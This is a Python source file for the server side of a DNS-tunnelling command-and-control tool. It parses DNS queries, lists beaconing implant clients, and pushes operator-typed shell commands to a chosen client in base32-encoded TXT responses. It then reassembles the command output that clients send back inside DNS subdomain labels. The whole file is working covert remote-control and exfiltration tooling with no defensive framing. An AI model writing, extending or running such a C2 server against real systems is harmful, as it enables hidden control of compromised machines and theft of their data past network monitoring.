import os
import click
import socket
import base64
import datetime
import requests
import threading
import ipaddress


class C2DnsServer:

    ID_HELLO = 0xFFFF  # ID of hello message
    ID_END_OF_TRANSMISSION = 0xFFFE  # ID of last message in data stream
    JUNK_MASK = 0xFFFF000000
    CLIENT_MASK = 0x0000FF0000
    ID_MASK = 0x000000FFFF

    def __init__(self, ip, port, domain_name):
        self.data_to_send = ""
        self.is_data_ready = False
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind((ip, port))
        self.num_of_labels_in_domain = len(domain_name.split("."))
        self.hex_ip_address = self.get_public_ip_hex()

    # Returns list of labels (in uppercase) from the DNS query.
    # info_block.my.domain.com -> ['INFO_BLOCK', 'MY', 'DOMAIN', 'COM']
    def cut_domain_to_labels(self, request_data):
        i = 12
        labels = []
        while request_data[i] != 0:
            labels.append(request_data[i + 1 : i + request_data[i] + 1])
            i += request_data[i] + 1
        labels = [label.upper() for label in labels]
        return labels

    # Returns raw data from the domain name from the DNS query.
    # data1.data2.data3.info_block.my.domain.com -> b'data1data2data3'
    def read_data_from_request(self, request_data):
        raw_data = bytearray()
        labels = self.cut_domain_to_labels(request_data)
        for label in labels[: -(1 + self.num_of_labels_in_domain)]:
            raw_data.extend(label)
        return bytes(raw_data)

    # Reads info_block from the DNS query and returns value
    # by performing bitwise AND with the given mask.
    # info_block & CLIENT_MASK = client_id
    def decode_info(self, request_data, mask):
        labels = self.cut_domain_to_labels(request_data)
        decoded_id = base64.b32decode(labels[-(self.num_of_labels_in_domain + 1)])
        return int.from_bytes(decoded_id, byteorder="big") & mask

    # Returns a type of the DNS query (A=1, TXT=16).
    def get_query_type(self, request_data):
        i = 12
        while request_data[i] != 0:
            i += request_data[i] + 1
        type = request_data[i + 1 : i + 3]
        return int.from_bytes(type, "big")

    # Returns a public IP address (in hex) of the server.
    def get_public_ip_hex(self):
        address = ipaddress.IPv4Address(requests.get("https://api.ipify.org").text)
        hex_ip = int(address).to_bytes(4, byteorder="big")
        return hex_ip

    # Generates a DNS response from the DNS query and given data. 
    # If the DNS query isn't TXT, data argument is ignored and public IP is sent.
    def gen_response(self, request_data, data):
        header = bytearray(request_data[:12])  # copy header from query
        header[2] |= 132  # set QR and AA bits
        header[3] |= 128  # set RA bit
        header[6:8] = b"\x00\x01"  # set ANCOUNT = 1
        header[10:12] = b"\x00\x00"  # set ARCOUNT = 0

        # iterate over domain name
        i = 12
        while request_data[i] != 0:
            i += request_data[i] + 1

        query = request_data[12 : i + 1]  # copy query
        type_class = request_data[i + 1 : i + 5]  # get type and class

        name_addr = b"\xC0\x0C"  # name compression
        ttl = b"\x00\x00\x00\x01"  # TTL 1s

        if self.get_query_type(request_data) == 16:
            data = data.encode("utf-8")
            data_length = (len(data) + 1).to_bytes(2, "big", signed=False)
            txt_length = len(data).to_bytes(1, "big", signed=False)
            return bytearray(
                header
                + query
                + type_class
                + name_addr
                + type_class
                + ttl
                + data_length
                + txt_length
                + data
            )
        else:
            data_length = b"\x00\x04"
            data = self.hex_ip_address
            return bytearray(
                header
                + query
                + type_class
                + name_addr
                + type_class
                + ttl
                + data_length
                + data
            )

    # Reads a command from the operator and encodes to base32. This function should be
    # run in another thread and when the command is ready, flag is_data_ready is set.
    def read_command(self):
        self.data_to_send = input(">")
        self.data_to_send += " 2>/dev/stdout"
        self.data_to_send = base64.b32encode(self.data_to_send.encode()).decode()
        self.is_data_ready = True

    # Listens for clients' hello messages and lists active clients. This operation is
    # passive, so clients won't get any response from the server. If two clients
    # happen to get the same ID, they won't be differentiable.
    def listen(self):
        clients = {}
        os.system("clear")
        print("Clients: ")
        while True:
            data, addr = self.sock.recvfrom(512)
            if (
                self.get_query_type(data) == 16
                and self.decode_info(data, self.ID_MASK) == self.ID_HELLO
            ):
                client_id = self.decode_info(data, self.CLIENT_MASK) >> 16
                junk = self.decode_info(data, self.JUNK_MASK)
                if client_id not in clients or clients[client_id][0] != junk:
                    os.system("clear")
                    print("Clients: ")
                    now = datetime.datetime.now()
                    curr_date_time = now.strftime("%H:%M:%S (%d/%m/%Y)")
                    clients[client_id] = (junk, curr_date_time)
                    for key in clients:
                        print(f" - ID:{key} \t last seen: {clients[key][1]}")

    # Runs the command and control function of the server. Only control of one
    # client at the time is possible and his ID has to be specified in arguments.
    #
    # Three phases can be distinguished:
    #   1. Waiting for a hello message from client and sending him the command if ready
    #   2. Receiving result of command execution until DNS query with 
    #      ID_END_OF_TRANSMISSION message id is received
    #   3. Sorting by message id and decoding the result
    #
    # DNS response is sent for every DNS query, with empty data for TXT or with
    # public IP for A. The purpose of this is to prevent retransmission of requests
    # and to confirm receival of data.
    def run(self, client_id, debug):
        while True:

            # phase 1
            thread = threading.Thread(target=self.read_command)
            thread.start()
            message = bytearray()
            packets = {}
            while True:
                data, addr = self.sock.recvfrom(512)
                if (
                    self.is_data_ready
                    and self.get_query_type(data) == 16
                    and self.decode_info(data, self.CLIENT_MASK) >> 16 == client_id
                ):
                    print("Command sent!")
                    self.sock.sendto(self.gen_response(data, self.data_to_send), addr)
                    self.is_data_ready = False
                    break
                else:
                    self.sock.sendto(self.gen_response(data, ""), addr)

            # phase 2
            is_end_of_transmission_reached = False
            while not is_end_of_transmission_reached:
                data, addr = self.sock.recvfrom(512)
                self.sock.sendto(self.gen_response(data, ""), addr)
                if (
                    self.get_query_type(data) == 16
                    and self.decode_info(data, self.CLIENT_MASK) >> 16 == client_id
                    and self.decode_info(data, self.ID_MASK) != self.ID_HELLO
                ):
                    print(".", end="", flush=True)
                    if (
                        self.decode_info(data, self.ID_MASK)
                        == self.ID_END_OF_TRANSMISSION
                    ):
                        is_end_of_transmission_reached = True
                    else:
                        packets[self.decode_info(data, self.ID_MASK)] = data

            # phase 3
            for key in sorted(packets):
                message.extend(self.read_data_from_request(packets[key]))
                if debug:
                    print(f"{key}\t{self.read_data_from_request(packets[key])}")

            if debug:
                print(f"Data to decode: \n{bytes(message)}")
            print()
            print(base64.b32decode(bytes(message)).decode(errors="replace"))


# Command line interface


@click.group()
def cli():
    pass


@cli.command()
@click.option("--domain", "-d", prompt="Domain name", help="Domain name")
@click.option(
    "--socket-ip",
    "-s",
    prompt="IP of the interface to run the DNS server on",
    help="IP of the interface to run the DNS server on",
)
@click.option("--port", "-p", default=53, show_default=True, help="Custom port number")
def list_clients(domain, socket_ip, port):
    server = C2DnsServer(socket_ip, port, domain)
    server.listen()


@cli.command()
@click.option("--domain", "-d", prompt="Domain name", help="Domain name")
@click.option(
    "--socket-ip",
    "-s",
    prompt="IP of the interface to run the DNS server on",
    help="IP of the interface to run the DNS server on",
)
@click.option(
    "--client-id",
    "-c",
    type=int,
    prompt="ID of the client to control",
    help="ID of the client to control",
)
@click.option("--port", "-p", default=53, show_default=True, help="Custom port number")
@click.option("--debug", is_flag=True)
def command_and_control(domain, socket_ip, client_id, port, debug):
    server = C2DnsServer(socket_ip, port, domain)
    server.run(client_id, debug)


if __name__ == "__main__":
    cli()
